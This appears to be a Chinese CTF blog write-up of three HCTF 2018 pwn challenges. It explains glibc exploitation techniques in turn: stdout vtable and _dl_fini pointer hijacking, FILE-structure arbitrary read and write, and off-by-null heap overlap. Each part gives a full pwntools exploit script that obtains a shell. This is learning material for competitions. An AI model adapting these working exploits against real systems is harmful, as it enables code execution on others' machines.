---
layout: post
title:  "HCTF 2018 部分 PWN writeup"
date:   2018-12-19 07:00:00
categories: ctf
permalink: /archivers/HCTF-2018-PWN-writeup
---
## 前言
这次比赛因为有事所以比赛期间做不了pwn题，现在只能事后看着大佬们的wp把题目再学习一波。

## the_end
### 漏洞
漏洞很明显，任意地址写五字节。
### 利用
需要解决的问题是如何利用已有的五字节get shell。
首先checksec检查保护：
```C
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : ENABLED
NX        : ENABLED
PIE       : ENABLED
RELRO     : FULL
```
`RELRO`是full，所以不能写got，然后在看到在最后返回的时候是直接掉用`exit`函数的，因此应该是通过`exit`函数里面掉用的函数指针来劫持控制流。

首先是信息泄露，得到`libc`地址，这一点很明显。
大佬们的wp关于劫持函数流有两种思路，一种是利用`stdout`的函数表，一种是`_dl_fini`函数中的函数指针，下面对于这两种解法进行描述。

#### 修改`stdout`函数表
因为glibc是2.23的，没有vtable的检查，因此修改函数表不会引起程序的错误。

查看`exit`函数的源码，exit中存在一条函数调用链，`exit->__run_exit_handlers->_IO_cleanup->_IO_flush_all_lockp`。看到最后这个`_IO_flush_all_lockp`就感觉应该可以利用这一点拿shell。这个函数里关键的源码是：
```C
fp = (_IO_FILE *) _IO_list_all;
  while (fp != NULL)
    {
      run_fp = fp;
      if (do_lock)
    _IO_flockfile (fp);

      if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)
#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
       || (_IO_vtable_offset (fp) == 0
           && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
                    > fp->_wide_data->_IO_write_base))
#endif
       )
      && _IO_OVERFLOW (fp, EOF) == EOF)
```
从源码中可以看到，如果可以控制`stdin`、`stdout`或者`stderr`中实现`fp->_mode <= 0`以及`fp->_IO_write_ptr > fp->_IO_write_base`同时修改vtable里面的`_IO_OVERFLOW`为one gadget，那么就可以顺利的劫持控制流。
经过测试，五字节的修改思路为：

* 修改`stdout`中`_IO_write_ptr`最后一字节，实现`fp->_IO_write_ptr > fp->_IO_write_base`
* 修改`stdout`中vtable的倒数第二字节，实现该伪造的` _IO_OVERFLOW`存在libc相关地址
* 最后修改伪造的` _IO_OVERFLOW`的后三字节为one gadget。
经过这五字节的修改，执行`exit`函数时会最终执行one gadget，获得shell。

exp如下：
```PYTHON
from pwn import *
DEBUG = 1
if DEBUG:
     p = process('./the_end')
     e = ELF('./the_end')
     libc = ELF('./libc64.so')
     
else:
     p = remote('150.109.46.159', 20002)
     libc = ELF('./libc64.so')
     #libc = ELF('libc_64.so.6')

wordSz = 4
hwordSz = 2
bits = 32
PIE = 0
mypid=0
def leak(address, size):
   with open('/proc/%s/mem' % mypid) as mem:
      mem.seek(address)
      return mem.read(size)

def findModuleBase(pid, mem):
   name = os.readlink('/proc/%s/exe' % pid)
   with open('/proc/%s/maps' % pid) as maps:
      for line in maps:
         if name in line:
            addr = int(line.split('-')[0], 16)
            mem.seek(addr)
            if mem.read(4) == "\x7fELF":
               bitFormat = u8(leak(addr + 4, 1))
               if bitFormat == 2:
                  global wordSz
                  global hwordSz
                  global bits
                  wordSz = 8
                  hwordSz = 4
                  bits = 64
               return addr
   log.failure("Module's base address not found.")
   sys.exit(1)

def debug(addr):
    global mypid
    mypid = proc.pidof(p)[0]
    #raw_input('debug:')
    
    with open('/proc/%s/mem' % mypid) as mem:
        moduleBase = findModuleBase(mypid, mem)
        print "program_base",hex(moduleBase)
        gdb.attach(p, "set follow-fork-mode parent\nb *" + hex(moduleBase+addr))

def write_value(addr,value):
    p.send(p64(addr))
    p.send(p8(value))
def pwn():
    #debug(0x964)
    #p.recvuntil('token:')
    #p.sendline('6ywP1UFC9MJMgU7LdgSZcqXyvkws1fFY')
    p.recvuntil('gift ')
    sleep_addr=int(p.recv(14),16)
    print "sleep_addr",hex(sleep_addr)
    
    libc_base=sleep_addr-libc.symbols['sleep']
    rce=0xf02a4+libc_base
    
    print "rce",hex(rce)
    
    addr1=libc_base+libc.symbols['_IO_2_1_stdout_']+5*8
    value1=0xff
    write_value(addr1,value1)

    addr2=libc_base+libc.symbols['_IO_2_1_stdout_']+0xd8+1
    value2=((libc_base+libc.symbols['_IO_file_jumps']+0xe00)>>8)&0xff
    write_value(addr2,value2)
    #print hex(addr2),hex(value2)
    
    addr3=libc_base+libc.symbols['_IO_file_jumps']+0xe00+3*8
    value3=rce&0xff
    write_value(addr3,value3)
    #print hex(addr3)
    addr4=libc_base+libc.symbols['_IO_file_jumps']+0xe00+3*8+1
    value4=(rce>>8)&0xff
    write_value(addr4,value4)

    addr5=libc_base+libc.symbols['_IO_file_jumps']+0xe00+3*8+2
    value5=(rce>>16)&0xff
    write_value(addr5,value5)
    
    #print *(struct _IO_FILE_plus *) 0x000055a20796d030
    
    #p.sendline('cat flag 1>&0')
    p.sendline('exec /bin/sh 1>&0')
    p.interactive()

if __name__ == '__main__':
   pwn()
```

#### 修改`_dl_fini`函数指针
还是查看`exit`函数的源码，一条调用链是`exit->_dl_fini`，查看`_dl_fini`源码：
```C
    _dl_fini (void)
{
    ...
#ifdef SHARED
  int do_audit = 0;
 again:
#endif
  for (Lmid_t ns = GL(dl_nns) - 1; ns >= 0; --ns)
    {
      /* Protect against concurrent loads and unloads.  */
      __rtld_lock_lock_recursive (GL(dl_load_lock));

      unsigned int nloaded = GL(dl_ns)[ns]._ns_nloaded;
      /* No need to do anything for empty namespaces or those used for
     auditing DSOs.  */
      if (nloaded == 0
        ...
```
可以看到该函数调用了`__rtld_lock_lock_recursive`函数，再看这个函数的定义：
```C
    # define __rtld_lock_lock_recursive(NAME) \
       GL(dl_rtld_lock_recursive) (&(NAME).mutex)
```
查看宏`GL`的定义：
```C
# if IS_IN (rtld)
#  define GL(name) _rtld_local._##name
# else
#  define GL(name) _rtld_global._##name
# endif
```
`_rtld_global`是一个结构体，所以`__rtld_lock_lock_recursive`函数实际上是结构体中的一个函数指针，在gdb实际调试出现的指令为：
```C
0x7f7420f80b27 <_dl_fini+119>:  
    lea    rdi,[rip+0x215e1a]        # 0x7f7421196948 <_rtld_global+2312>
=> 0x7f7420f80b2e <_dl_fini+126>:   
    call   QWORD PTR [rip+0x216414]        # 0x7f7421196f48 <_rtld_global+3848>

```
所以可以修改`_rtld_global`结构体的`__rtld_lock_lock_recursive`指针，将其修改为one gadget即可。
事实上，好像只要修改三个字节就可以实现了。

exp如下：
```PYTHON
from pwn import *


DEBUG = 1
if DEBUG:
     p = process('./the_end')
     e = ELF('./the_end')
     #scontext.log_level = 'debug'
     #libc=ELF('/lib/i386-linux-gnu/libc-2.23.so')b0verfl0w
     #libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
     #p = process(['./reader'], env={'LD_PRELOAD': os.path.join(os.getcwd(),'libc-2.19.so')})
     libc = ELF('./libc64.so')
     ld = ELF('/lib/x86_64-linux-gnu/ld-2.23.so')
     
else:
     p = remote('150.109.46.159', 20002)
     libc = ELF('./libc64.so')
     #libc = ELF('libc_64.so.6')

wordSz = 4
hwordSz = 2
bits = 32
PIE = 0
mypid=0
def leak(address, size):
   with open('/proc/%s/mem' % mypid) as mem:
      mem.seek(address)
      return mem.read(size)

def findModuleBase(pid, mem):
   name = os.readlink('/proc/%s/exe' % pid)
   with open('/proc/%s/maps' % pid) as maps:
      for line in maps:
         if name in line:
            addr = int(line.split('-')[0], 16)
            mem.seek(addr)
            if mem.read(4) == "\x7fELF":
               bitFormat = u8(leak(addr + 4, 1))
               if bitFormat == 2:
                  global wordSz
                  global hwordSz
                  global bits
                  wordSz = 8
                  hwordSz = 4
                  bits = 64
               return addr
   log.failure("Module's base address not found.")
   sys.exit(1)

def debug(addr):
    global mypid
    mypid = proc.pidof(p)[0]
    #raw_input('debug:')
    
    with open('/proc/%s/mem' % mypid) as mem:
        moduleBase = findModuleBase(mypid, mem)
        print "program_base",hex(moduleBase)
        gdb.attach(p, "set follow-fork-mode parent\nb *" + hex(moduleBase+addr))

def write_value(addr,value):
    p.send(p64(addr))
    p.send(p8(value))
def pwn():
    #debug(0x964)
    #p.recvuntil('token:')
    #p.sendline('6ywP1UFC9MJMgU7LdgSZcqXyvkws1fFY')
    p.recvuntil('gift ')
    sleep_addr=int(p.recv(14),16)
    print "sleep_addr",hex(sleep_addr)
    
    libc_base=sleep_addr-libc.symbols['sleep']
    rce=0xf02a4+libc_base
    
    print "rce",hex(rce)
    
    ld_base=libc_base+0x3ca000
    _rtld_global=ld_base+ld.symbols['_rtld_global']
    addr=_rtld_global+0xf08
    print hex(ld_base+ld.symbols['_rtld_global'])
    #print *(struct _IO_FILE_plus *) 0x000055a20796d030
    write_value(addr,rce&0xff)
    write_value(addr+1,(rce>>8)&0xff)
    write_value(addr+2,(rce>>16)&0xff)
    
    for i in range(0,2):
        p.send(p64(libc_base+libc.symbols['__malloc_hook']))
        p.send(p8(0))
    #p.sendline('cat flag 1>&0')
    p.sendline('exec /bin/sh 1>&0')
    p.interactive()

if __name__ == '__main__':
   pwn()
```

## babyprintf_ver2
### 漏洞
漏洞也很明显，格式化字符串漏洞，格式化字符串在bss段上，同时使用的是printf_chk函数。
### 利用
格式化字符串的buff后面可以覆盖`stdout`，因此这题最后的解仍然是使用`stdout`来实现任意写任意读。由于是libc2.27，虚表存在检查，且在函数中也会将修改后的虚表改回去，因此无法使用函数表来做文章，但是仍然可以用`stdout`结构体里的数据实现任意写与任意读。
`checksec`查看程序开启的保护机制：
```C
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled

```
程序看起了`PIE`以及`full`的`RELRO`，因此无法修改`got`表劫持控制流。
首先贴出`_IO_FILE`结构体的定义，后面用的到：
```
struct _IO_FILE {
  int _flags;   /* High-order word is _IO_MAGIC; rest is flags. */
#define _IO_file_flags _flags

  /* The following pointers correspond to the C++ streambuf protocol. */
  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */
  char* _IO_read_ptr; /* Current read pointer */
  char* _IO_read_end; /* End of get area. */
  char* _IO_read_base;  /* Start of putback+get area. */
  char* _IO_write_base; /* Start of put area. */
  char* _IO_write_ptr;  /* Current put pointer. */
  char* _IO_write_end;  /* End of put area. */
  char* _IO_buf_base; /* Start of reserve area. */
  char* _IO_buf_end;  /* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */

  struct _IO_marker *_markers;

  struct _IO_FILE *_chain;

  int _fileno;
#if 0
  int _blksize;
#else
  int _flags2;
#endif
  _IO_off_t _old_offset; /* This used to be _offset but it's too small.  */

#define __HAVE_COLUMN /* temporary */
  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];

  /*  char* _save_gptr;  char* _save_egptr; */

  _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
};
```
里面前面的几个指针比较关键。
#### 任意读
要实现完整的利用，首先是要实现地址泄露，可以通过`stdout`的任意读来实现地址的泄露。在程序中，我们已知的是程序的基址，因为一开始就打印出来了，可以利用bss段来伪造`stdout`结构体来实现任意读，相关涉及到的源代码如下：
```C
static
_IO_size_t
new_do_write (_IO_FILE *fp, const char *data, _IO_size_t to_do)
{
  ...
  else if (fp->_IO_read_end != fp->_IO_write_base) //需要绕过的check
    {
      _IO_off64_t new_pos
  = _IO_SYSSEEK (fp, fp->_IO_write_base - fp->_IO_read_end, 1);
      if (new_pos == _IO_pos_BAD)
  return 0;
      fp->_offset = new_pos;
    }
  count = _IO_SYSWRITE (fp, data, to_do);    //任意泄露的地方
  ...
}
```
以及
```C
if (ch == EOF)
    return _IO_do_write (f, f->_IO_write_base,
       f->_IO_write_ptr - f->_IO_write_base);
```
因此需要控制`stdout`结构体满足以下条件实现任意泄露：

* `_IO_write_base`指向想要泄露的地方。
* `_IO_write_ptr`指向泄露结束的地址。
* `_IO_read_end`等于`_IO_write_base`以绕过多余的代码。
满足这三个条件，可实现任意读。当然不包含结构体里的`_flags`字段的伪造，该字段都从原来的结构体里面复制过来，所以就没去分析该如何构造了。
#### 任意写
任意写功能的实现在于IO缓冲区没有满时，会先将要输出的数据复制到缓冲区中，可通过这一点来实现任意地址写的功能。相关源代码如下：
```C
_IO_size_t
_IO_new_file_xsputn (_IO_FILE *f, const void *data, _IO_size_t n)
{
  ...
  if ((f->_flags & _IO_LINE_BUF) && (f->_flags & _IO_CURRENTLY_PUTTING))
    {
      count = f->_IO_buf_end - f->_IO_write_ptr;
      if (count >= n)
  {
    const char *p;
    for (p = s + n; p > s; )
      {
        if (*--p == '\n')
    {
      count = p - s + 1;
      must_flush = 1;
      break;
    }
      }
  }
    }
  else if (f->_IO_write_end > f->_IO_write_ptr)
    count = f->_IO_write_end - f->_IO_write_ptr; /* Space available. */ //复制长度

  /* Then fill the buffer. */
  if (count > 0)
    {
      if (count > to_do)
  count = to_do;
#ifdef _LIBC
      f->_IO_write_ptr = __mempcpy (f->_IO_write_ptr, s, count);
#else
      memcpy (f->_IO_write_ptr, s, count); //复制发生的地方
      f->_IO_write_ptr += count;
```
可以看到当`_IO_write_end` 大于`_IO_write_ptr`时，`memcpy`就会调用，因此任意写，只需要将`_IO_write_ptr`指向需要写的地址，`_IO_write_end`指向结束位置即可。
有了任意读与任意写之后，具体实现就是使用任意读泄露libc地址，然后用任意写将`one gadget`写到`malloc_hook`中，然后利用`%n`报错或者是较大的字符打印来触发malloc函数。

最终的exp如下：
```PYTHON
from pwn import *

DEBUG = 1
if DEBUG:
     p = process('./babyprintf_ver2')
     e = ELF('./babyprintf_ver2')
     #scontext.log_level = 'debug'
     #libc=ELF('/lib/i386-linux-gnu/libc-2.23.so')b0verfl0w
     libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
     #p = process(['./reader'], env={'LD_PRELOAD': os.path.join(os.getcwd(),'libc-2.19.so')})
     #libc = ELF('./libc64.so')
     
     
else:
     p = remote('150.109.46.159', 20002)
     libc = ELF('./libc64.so')
     #libc = ELF('libc_64.so.6')

wordSz = 4
hwordSz = 2
bits = 32
PIE = 0
mypid=0
def leak(address, size):
   with open('/proc/%s/mem' % mypid) as mem:
      mem.seek(address)
      return mem.read(size)

def findModuleBase(pid, mem):
   name = os.readlink('/proc/%s/exe' % pid)
   with open('/proc/%s/maps' % pid) as maps:
      for line in maps:
         if name in line:
            addr = int(line.split('-')[0], 16)
            mem.seek(addr)
            if mem.read(4) == "\x7fELF":
               bitFormat = u8(leak(addr + 4, 1))
               if bitFormat == 2:
                  global wordSz
                  global hwordSz
                  global bits
                  wordSz = 8
                  hwordSz = 4
                  bits = 64
               return addr
   log.failure("Module's base address not found.")
   sys.exit(1)

def debug(addr):
    global mypid
    mypid = proc.pidof(p)[0]
    #raw_input('debug:')
    
    with open('/proc/%s/mem' % mypid) as mem:
        moduleBase = findModuleBase(mypid, mem)
        print "program_base",hex(moduleBase)
        gdb.attach(p, "set follow-fork-mode parent\nb *" + hex(moduleBase+addr))


def pwn():
    #debug(0x921)
    p.recvuntil('location to ')
    addr=int(p.recvuntil('\n')[:-1],16)
    print hex(addr)
    pro_base=addr-0x202010
    print "pro base",hex(pro_base)
    
    addr=pro_base+0x202010+0x100
    write_got=e.got['write']+pro_base
    print "write got",hex(write_got)
    flag=0xfbad2887
    flag&=~8
    flag|=0x800
    fake_file=p64(flag)               #_flags
    fake_file+=p64(0)                    #_IO_read_ptr
    fake_file+=p64(write_got)               #_IO_read_end
    fake_file+=p64(0)                    #_IO_read_base
    fake_file+=p64(write_got)               #_IO_write_base
    fake_file+=p64(write_got+8)             #_IO_write_ptr
    fake_file+=p64(0)             #_IO_write_end
    fake_file+=p64(0)                    #_IO_buf_base
    fake_file+=p64(0)                    #_IO_buf_end
    fake_file+=p64(0)                       #_IO_save_base
    fake_file+=p64(0)                       #_IO_backup_base
    fake_file+=p64(0)                       #_IO_save_end
    fake_file+=p64(0)                       #_markers
    fake_file+=p64(0)                       #chain   could be a anathor file struct
    fake_file+=p32(1)                       #_fileno
    fake_file+=p32(0)                       #_flags2
    fake_file+=p64(0xffffffffffffffff)      #_old_offset
    fake_file+=p16(0)                       #_cur_column
    fake_file+=p8(0)                        #_vtable_offset
    fake_file+=p8(0x10)                      #_shortbuf
    fake_file+=p32(0)            
    fake_file+=p64(addr)                    #_lock
    fake_file+=p64(0xffffffffffffffff)      #_offset
    fake_file+=p64(0)                       #_codecvt
    fake_file+=p64(addr)                    #_wide_data
    fake_file+=p64(0)                       #_freeres_list
    fake_file+=p64(0)                       #_freeres_buf
    fake_file+=p64(0)                       #__pad5
    fake_file+=p32(0xffffffff)              #_mode
    fake_file+=p32(0)                       #unused2
    fake_file+=p64(0)*2                     #unused2

    fake_file_addr=pro_base+0x202010+0x10+8
    data='a'*0x10+p64(fake_file_addr)+fake_file
    p.sendline(data)
    p.recvuntil('ed!\n')
    write_addr=u64(p.recv(8))
    print hex(write_addr)
    libc_base=write_addr-libc.symbols['write']
    system_addr=libc_base+libc.symbols['system']
    
    malloc_hook=libc_base+libc.symbols['__malloc_hook']
    addr=pro_base+0x202010+0x100
    #write_got=e.got['write']+pro_base
    flag=0xfbad2887
    #flag&=~4
    #flag|=0x800
    fake_file=p64(flag)               #_flags
    fake_file+=p64(0)             #_IO_read_ptr
    fake_file+=p64(0)             #_IO_read_end
    fake_file+=p64(0)             #_IO_read_base
    fake_file+=p64(0)             #_IO_write_base
    fake_file+=p64(malloc_hook)             #_IO_write_ptr
    fake_file+=p64(malloc_hook+0x8)         #_IO_write_end
    fake_file+=p64(0)                    #_IO_buf_base
    fake_file+=p64(0)                    #_IO_buf_end
    fake_file+=p64(0)                       #_IO_save_base
    fake_file+=p64(0)                       #_IO_backup_base
    fake_file+=p64(0)                       #_IO_save_end
    fake_file+=p64(0)                       #_markers
    fake_file+=p64(0)                       #chain   could be a anathor file struct
    fake_file+=p32(1)                       #_fileno
    fake_file+=p32(0)                       #_flags2
    fake_file+=p64(0xffffffffffffffff)      #_old_offset
    fake_file+=p16(0)                       #_cur_column
    fake_file+=p8(0)                        #_vtable_offset
    fake_file+=p8(0x10)                      #_shortbuf
    fake_file+=p32(0)            
    fake_file+=p64(addr)                    #_lock
    fake_file+=p64(0xffffffffffffffff)      #_offset
    fake_file+=p64(0)                       #_codecvt
    fake_file+=p64(addr)                    #_wide_data
    fake_file+=p64(0)                       #_freeres_list
    fake_file+=p64(0)                       #_freeres_buf
    fake_file+=p64(0)                       #__pad5
    fake_file+=p32(0xffffffff)              #_mode
    fake_file+=p32(0)                       #unused2
    fake_file+=p64(0)*2                     #unused2
    #debug(0x921)
    rce=libc_base+0x4526a
    data=p64(rce)*2+p64(fake_file_addr)+fake_file
    p.sendline(data)
    p.sendline("%n")
    p.interactive()

if __name__ == '__main__':
   pwn()
```
## heapstorm_zero
### 漏洞
存在一个`off-by-null`的漏洞，在函数`sub_EE0`中，会超过一字节并置0。
### 利用
感谢bscause大佬的`off-by-null`的利用思路：
```C
漏洞：off-by-null，只能把后一块的最低字节覆盖为0。
  目的：构造重叠块
  利用：
    a=malloc(0x100)（应该malloc(0x98)）；b=malloc(0x200)；c=malloc(0x100)
    free(b);（b大小为0x210）；a溢出把b块的size覆盖为0x200；（注意顺序，注意申请b时把偏移0x1f0处的prev_size设置为0x200）
    b1=malloc(0x80)；b2=malloc(0x80)；
    free(b1)；free(c)；（此时c块的prev_size没改变，和b合并）
    big=malloc(0x200)；即可得到big和b2重叠的块。
    unlink |  若b2是fast bin也可以fast bin attack。
```
根据官方的wp，这题的主要考点在于malloc的时候只能申请大小小于等于0x38的块，只能申请fastbin，无法构造overlap chunk，所以出题人设置了`scanf`函数，使得可以通过`scanf`来触发`malloc`申请比较大的堆块，从而触发`malloc consolidate`，使得构造重叠块成为可能。

接着就按上面的思路构造了重叠块，后面利用fastbin里的数据，将top chunk覆盖成了malloc hook上面一点的地址，最后申请出来，覆盖为one gadget，得到shell。

exp如下：
```PYTHON
from pwn import *

DEBUG = 1
if DEBUG:
     p = process('./heapstorm_zero')
     e = ELF('./heapstorm_zero')
     #scontext.log_level = 'debug'
     #libc=ELF('/lib/i386-linux-gnu/libc-2.23.so')b0verfl0w
     libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
     #p = process(['./reader'], env={'LD_PRELOAD': os.path.join(os.getcwd(),'libc-2.19.so')})
     #libc = ELF('./libc64.so')
     
     
else:
     p = remote('150.109.46.159', 20002)
     libc = ELF('./libc64.so')
     #libc = ELF('libc_64.so.6')

wordSz = 4
hwordSz = 2
bits = 32
PIE = 0
mypid=0
def leak(address, size):
   with open('/proc/%s/mem' % mypid) as mem:
      mem.seek(address)
      return mem.read(size)

def findModuleBase(pid, mem):
   name = os.readlink('/proc/%s/exe' % pid)
   with open('/proc/%s/maps' % pid) as maps:
      for line in maps:
         if name in line:
            addr = int(line.split('-')[0], 16)
            mem.seek(addr)
            if mem.read(4) == "\x7fELF":
               bitFormat = u8(leak(addr + 4, 1))
               if bitFormat == 2:
                  global wordSz
                  global hwordSz
                  global bits
                  wordSz = 8
                  hwordSz = 4
                  bits = 64
               return addr
   log.failure("Module's base address not found.")
   sys.exit(1)

def debug(addr):
    global mypid
    mypid = proc.pidof(p)[0]
    #raw_input('debug:')
    
    with open('/proc/%s/mem' % mypid) as mem:
        moduleBase = findModuleBase(mypid, mem)
        print "program_base",hex(moduleBase)
        gdb.attach(p, "set follow-fork-mode parent\nb *" + hex(moduleBase+addr))

def alloc(size,content):
    p.recvuntil('Choice:')
    p.sendline('1')
    p.recvuntil('size:')
    p.sendline(str(size))
    p.recvuntil('content:')
    p.send(content)


def view(idx):
    p.recvuntil('Choice:')
    p.sendline('2')
    p.recvuntil('index:')
    p.sendline(str(idx))
    p.recvuntil('Content: ')


def delete(idx):
    p.recvuntil('Choice:')
    p.sendline('3')
    p.recvuntil('index:')
    p.sendline(str(idx))
    
def big_scanf():
    p.recvuntil('Choice:')
    p.sendline('1'*0x500)

def pwn():
    #debug(0xEE0)
    
    alloc(0x38,'0'*8+'\n') #0

    alloc(0x38,'1'*8+'\n') #1
    alloc(0x38,'2'*8+'\n') #2
    alloc(0x38,'3'*8+'\n') #3
    alloc(0x38,'4'*0x30+p64(0x100)) #4
    alloc(0x38,'5'*8+'\n') #5
    
    alloc(0x38,'6'*8+'\n') #6
    alloc(0x38,'7'*8+'\n') #7
    for i in range(1,6):
        delete(i)
    
    big_scanf()
    delete(0)
    #debug(0xa8f)
    alloc(0x38,'0'*0x38) #0
    alloc(0x30,'1'*8+'\n') #1
    alloc(0x10,'2'*8+'\n') #2
    alloc(0x10,'3'*8+'\n') #3
    alloc(0x30,'4'*8+'\n') #4
    alloc(0x30,'4'*8+'\n') #5
    delete(1)
    
    big_scanf()
    delete(6)
    #debug(0xa8f)
    big_scanf()
    alloc(0x30,'1'*8+'\n') #1
    view(2)
    libc_base=u64(p.recv(6).ljust(8,'\x00'))-0x3c4b78
    rce=0x4526a+libc_base
    malloc_hook=libc_base+libc.symbols['__malloc_hook']

    alloc(0x10,'6'*8+'\n') #6
    alloc(0x10,'8'*8+'\n') #8
    alloc(0x30,'9'*8+'\n') #9
    alloc(0x30,'0'*8+'\n') #10
    #debug(0x126d)
    delete(6)
    delete(8)
    delete(2)
    
    delete(9)
    delete(10)
    delete(4)
    
    alloc(0x10,p64(0x41)+'\n') #2
    alloc(0x10,'4'*8+'\n')  #4
    alloc(0x10,'6'*8+'\n')  #6
    
    alloc(0x30,p64(libc_base+0x3c4b78-0x58)+'\n') #8
    alloc(0x30,'9'*8+'\n') #9
    alloc(0x30,'0'*8+'\n') #10
    
    alloc(0x30,p64(0)+p64(libc_base+0x3c4b78-0x28)+p64(0)*3+p64(0x41)) #11
    
    alloc(0x38,p64(0)*3+p64(malloc_hook-0x10)+p64(0)+p64(libc_base+0x3c4b78)+p64(libc_base+0x3c4b78)[:-1]+'\n') #12
    alloc(0x30,p64(rce)+'\n')
    
    p.recvuntil('Choice:')
    p.sendline('1')
    p.recvuntil('size:')
    p.sendline('1')
    p.interactive()

if __name__ == '__main__':
   pwn()
```

## 小结
[所有代码及idb啥的在这里](https://github.com/ray-cp/ctf-pwn/tree/master/hctf2018)